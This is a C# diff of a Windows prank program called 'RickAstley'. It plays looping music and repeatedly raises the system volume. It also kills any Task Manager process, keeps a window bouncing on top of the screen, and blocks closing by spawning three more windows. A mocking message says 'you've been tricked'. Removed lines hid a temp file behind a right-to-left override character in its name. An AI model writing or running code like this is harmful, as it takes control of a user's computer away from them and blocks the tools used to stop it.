@@ -1,7 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
 using System.Drawing;
-using System.IO;
 using System.Media;
 using System.Runtime.InteropServices;
 using System.Threading;
@@ -10,108 +9,72 @@ using RickAstley.Properties;
 
 namespace RickAstley {
     public partial class Form1 : Form {
-        private const uint WM_APPCOMMAND = 0x319;
-        private const uint APPCOMMAND_VOLUME_UP = 0x0a;
-
+        private const bool Debug = true;
         private readonly bool playsMusic = true;
         public Form1(bool music = true) {
             InitializeComponent();
             playsMusic = music;
         }
 
-        private void killSelf() { Process.GetCurrentProcess().Kill(); }
-
         private void Form1_Load(object sender, EventArgs e) {
-            string sysroot = Environment.GetEnvironmentVariable("SYSTEMROOT");
-            if (Application.ExecutablePath != sysroot + "\\rick.exe") killSelf();
-            CheckForIllegalCrossThreadCalls = false;
-            lock (GIFLock._lock) label1.Image = Resources.Astley;
+            if (!Debug) {
+                string sysroot = Environment.GetEnvironmentVariable("SYSTEMROOT");
+                if (Application.ExecutablePath != sysroot + "\\rick.exe") Process.GetCurrentProcess().Kill();
+            }
+            lock (this) label1.Image = Resources.Astley;
 
             if (playsMusic) {
-                ExtractFile(Resources.rick, Path.GetTempPath() + "\u202elog.wav");
                 try {
-                    SoundPlayer sp = new SoundPlayer(Path.GetTempPath() + "\u202elog.wav");
-                    sp.PlayLooping();
-                }
-                catch { }
+                    lock (this) {
+                        SoundPlayer sp = new SoundPlayer(Resources.rick);
+                        sp.PlayLooping();
+                    }
+                } catch { }
                 button1.Visible = true;
             }
-            Thread moveTh = new Thread(MoveThread);
+
+            CheckForIllegalCrossThreadCalls = false;
+
+            Thread moveTh = new Thread(() => {
+                int xOff = 5;
+                int yOff = 5;
+                int xPos = 0;
+                int yPos = 0;
+                Random random = new Random();
+                while (true) {
+                    if (playsMusic) {
+                        if (!Debug) SendMessage(this.Handle, WM_APPCOMMAND, 0x30292, APPCOMMAND_VOLUME_UP * 0x10000);
+                        try {
+                            foreach(Process p in Process.GetProcessesByName("taskmgr")) p.Kill();
+                        } catch { }
+                    }
+
+                    xPos += xOff;
+                    yPos += yOff;
+
+                    if (xPos > Screen.GetBounds(this).Width - this.Width) xOff = (int) (Math.Ceiling(-6 * random.NextDouble()) * 5 - 10);
+                    if (xPos < 0) xOff = (int) (Math.Ceiling(7 * random.NextDouble()) * 5 - 10);
+
+                    if (yPos > Screen.GetBounds(this).Height - this.Height) yOff = (int) (Math.Ceiling(-6 * random.NextDouble()) * 5 - 10);
+                    if (yPos < 0) yOff = (int) (Math.Ceiling(7 * random.NextDouble()) * 5 - 10);
+
+                    if (playsMusic) SetWindowPos(this.Handle, HWND_TOPMOST, xPos, yPos, 0, 0, SWP_SHOWWINDOW | SWP_NOSIZE);
+                    else SetWindowPos(this.Handle, 0, xPos, yPos, 0, 0, SWP_NOZORDER | SWP_SHOWWINDOW | SWP_NOSIZE);
+                    Thread.Sleep(1);
+                }
+            });
             moveTh.IsBackground = true;
             moveTh.Start();
         }
 
-        private void ExtractFile(Stream resource, string path) {
-            BufferedStream input = new BufferedStream(resource);
-            FileStream output = new FileStream(path, FileMode.Create);
-            byte[] data = new byte[1024];
-            int lengthEachRead;
-            while ((lengthEachRead = input.Read(data, 0, data.Length)) > 0) {
-                output.Write(data, 0, lengthEachRead);
-            }
-            output.Flush();
-            output.Close();
-        }
-
-        [DllImport("user32.dll", EntryPoint = "SetWindowPos")]
-        public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, uint wParam, uint lParam);
-
-        private void MoveThread() {
-            const int SWP_SHOWWINDOW = 0x0040;
-            const int SWP_NOSIZE = 1;
-            const int SWP_NOZORDER = 4;
-            const int HWND_TOPMOST = -1;
-
-            int xOff = 5;
-            int yOff = 5;
-            int xPos = 0;
-            int yPos = 0;
-            Random random = new Random();
-            while (true) {
-                SendMessage(this.Handle, WM_APPCOMMAND, 0x30292, APPCOMMAND_VOLUME_UP * 0x10000);
-
-                try {
-                    foreach(Process p in Process.GetProcessesByName("taskmgr")) {
-                        p.Kill();
-                    }
-                }
-                catch { }
-
-                xPos += xOff;
-                yPos += yOff;
-
-                if (xPos > Screen.GetBounds(this).Width - this.Width) xOff = (int)(Math.Ceiling(-6 * random.NextDouble()) * 5 - 10);
-                if (xPos < 0) xOff = (int)(Math.Ceiling(7 * random.NextDouble()) * 5 - 10);
-
-                if (yPos > Screen.GetBounds(this).Height - this.Height) yOff = (int)(Math.Ceiling(-6 * random.NextDouble()) * 5 - 10);
-                if (yPos < 0) yOff = (int)(Math.Ceiling(7 * random.NextDouble()) * 5 - 10);
-
-                if (playsMusic) {
-                    SetWindowPos(this.Handle, HWND_TOPMOST, xPos, yPos, 0, 0, SWP_SHOWWINDOW | SWP_NOSIZE);
-                } else {
-                    SetWindowPos(this.Handle, 0, xPos, yPos, 0, 0, SWP_NOZORDER | SWP_SHOWWINDOW | SWP_NOSIZE);
-                }
-                Thread.Sleep(1);
-            }
-        }
-
-        private void MessageBoxThread() {
-            MessageBox.Show("你 被 骗 了");
-        }
-
         private void Form1_FormClosing(object sender, FormClosingEventArgs e) {
-            Thread msgbox = new Thread(MessageBoxThread);
-            msgbox.IsBackground = true;
-            msgbox.Start();
+            new Thread(() => {
+                MessageBox.Show("别想关掉(doge)");
+            }).Start();
             e.Cancel = true;
-            Form[] duplicateForm = new Form[3];
-            for (int i = 0; i < duplicateForm.GetLength(0); i++) {
-                duplicateForm[i] = new Form1(false);
-                duplicateForm[i].Show();
-                Thread.Sleep(10);
+            for (int i = 0; i < 3; i++) {
+                Form form = new Form1(false);
+                form.Show();
             }
         }
 
@@ -127,13 +90,26 @@ namespace RickAstley {
         }
 
         private void button1_Click(object sender, EventArgs e) {
-            Thread msgbox = new Thread(MessageBoxThread);
-            msgbox.IsBackground = true;
-            msgbox.Start();
+            new Thread(() => {
+                MessageBox.Show("你 被 骗 了");
+            }).Start();
         }
 
-        public static class GIFLock {
-            public static object _lock = new object();
-        }
+        #region
+
+        [DllImport("user32.dll", EntryPoint = "SetWindowPos")]
+        private static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SendMessage(IntPtr hWnd, uint msg, uint wParam, uint lParam);
+
+        private const uint WM_APPCOMMAND = 0x319;
+        private const uint APPCOMMAND_VOLUME_UP = 0x0a;
+        private const int SWP_SHOWWINDOW = 0x0040;
+        private const int SWP_NOSIZE = 1;
+        private const int SWP_NOZORDER = 4;
+        private const int HWND_TOPMOST = -1;
+
+        #endregion
     }
 }
